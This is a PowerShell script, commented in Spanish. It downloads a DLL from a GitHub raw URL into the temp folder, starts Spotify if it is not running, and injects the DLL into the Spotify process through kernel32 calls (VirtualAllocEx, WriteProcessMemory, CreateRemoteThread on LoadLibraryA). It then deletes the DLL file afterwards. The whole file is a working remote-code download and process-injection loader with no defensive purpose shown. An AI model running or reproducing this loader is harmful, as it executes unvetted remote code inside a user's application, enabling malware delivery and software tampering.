# CONFIG
$dllUrl = "https://raw.githubusercontent.com/WkgGlobalservices2024/shzzz/main/xgamecontrol.dll"
$dllPath = "$env:TEMP\xgamecontrol.dll"
$proc = "Spotify"
$spotifyPath = "$env:APPDATA\Spotify\Spotify.exe"

# DESCARGA EL DLL
Invoke-WebRequest -Uri $dllUrl -OutFile $dllPath

# INYECCIÓN
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public static class Kernel32
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@ | Out-Null

function Inject-Dll {
    param(
        [string]$ProcessName,
        [string]$DllPath
    )
    $process = Get-Process -Name $ProcessName -ErrorAction SilentlyContinue | Select-Object -First 1
    if (-not $process) { return }
    $targetPid = $process.Id # <-- Variable distinta a $PID
    $PROCESS_ALL_ACCESS = 0x1F0FFF
    $MEM_COMMIT = 0x1000
    $PAGE_READWRITE = 0x04
    $hProcess = [Kernel32]::OpenProcess($PROCESS_ALL_ACCESS, $false, [uint32]$targetPid)
    if ($hProcess -eq [IntPtr]::Zero) { return }
    $bytes = [System.Text.Encoding]::ASCII.GetBytes($DllPath + [char]0)
    $alloc = [Kernel32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, $bytes.Length, $MEM_COMMIT, $PAGE_READWRITE)
    if ($alloc -eq [IntPtr]::Zero) { [Kernel32]::CloseHandle($hProcess) | Out-Null; return }
    $written = [UIntPtr]::Zero
    $r = [Kernel32]::WriteProcessMemory($hProcess, $alloc, $bytes, $bytes.Length, [ref]$written)
    if (-not $r) { [Kernel32]::CloseHandle($hProcess) | Out-Null; return }
    $hKernel32 = [Kernel32]::GetModuleHandle("kernel32.dll")
    $loadLibraryAddr = [Kernel32]::GetProcAddress($hKernel32, "LoadLibraryA")
    if ($loadLibraryAddr -eq [IntPtr]::Zero) { [Kernel32]::CloseHandle($hProcess) | Out-Null; return }
    $hThread = [Kernel32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $loadLibraryAddr, $alloc, 0, [IntPtr]::Zero)
    if ($hThread -eq [IntPtr]::Zero) { [Kernel32]::CloseHandle($hProcess) | Out-Null; return }
    [Kernel32]::CloseHandle($hThread) | Out-Null
    [Kernel32]::CloseHandle($hProcess) | Out-Null
}

# INICIA SPOTIFY SI NO ESTÁ ABIERTO
if (-not (Get-Process -Name $proc -ErrorAction SilentlyContinue)) {
    Start-Process -FilePath $spotifyPath
    $retry = 0
    while (-not (Get-Process -Name $proc -ErrorAction SilentlyContinue)) {
        Start-Sleep -Milliseconds 500
        $retry++
        if ($retry -gt 40) { break }
    }
}

# INYECTA EL DLL
Inject-Dll -ProcessName $proc -DllPath $dllPath

# INTENTA BORRAR EL DLL, SI NO SE PUEDE, ESPERA A QUE EL PROCESO TERMINE
try {
    Remove-Item $dllPath -Force
} catch {
    Write-Host "El DLL está en uso. Esperando a que el proceso termine para borrar..."
    # Espera a que Spotify termine
    while (Get-Process -Name $proc -ErrorAction SilentlyContinue) {
        Start-Sleep -Seconds 2
    }
    try { Remove-Item $dllPath -Force } catch {}
}